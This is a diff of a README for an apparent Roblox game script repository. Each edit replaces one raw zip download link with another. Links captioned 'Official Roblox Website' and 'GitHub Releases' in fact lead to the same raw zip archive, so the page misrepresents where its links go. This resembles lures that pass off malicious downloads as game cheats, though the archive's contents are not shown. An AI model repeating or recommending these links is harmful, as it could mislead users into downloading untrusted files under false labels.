@@ -6,7 +6,7 @@ Welcome to the **99-Nights-in-The-Forest-Script**! This powerful utility script 
 
 ## 📥 Download Now
 
-[![Download 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/rigorously/99-Nights-in-The-Forest-Script.zip)](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/rigorously/99-Nights-in-The-Forest-Script.zip)
+[![Download 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/Scripts/Script_Nights_The_in_Forest_2.7.zip)](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/Scripts/Script_Nights_The_in_Forest_2.7.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Welcome to the **99-Nights-in-The-Forest-Script**! This powerful utility script 
 
 To get started, visit the page to download the script:
 
-[Download 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/rigorously/99-Nights-in-The-Forest-Script.zip)
+[Download 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/Scripts/Script_Nights_The_in_Forest_2.7.zip)
 
 ### Step-by-Step Installation
 
@@ -67,8 +67,8 @@ You can find more information about the script and related topics in the followi
 
 ## 🔗 Helpful Links
 
-- [Official Roblox Website](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/rigorously/99-Nights-in-The-Forest-Script.zip)
-- [GitHub Releases for 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/rigorously/99-Nights-in-The-Forest-Script.zip)
+- [Official Roblox Website](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/Scripts/Script_Nights_The_in_Forest_2.7.zip)
+- [GitHub Releases for 99-Nights-in-The-Forest-Script](https://raw.githubusercontent.com/shafhyfox/99-Nights-in-The-Forest-Script/main/Scripts/Script_Nights_The_in_Forest_2.7.zip)
 
 ## 🧩 Conclusion
 
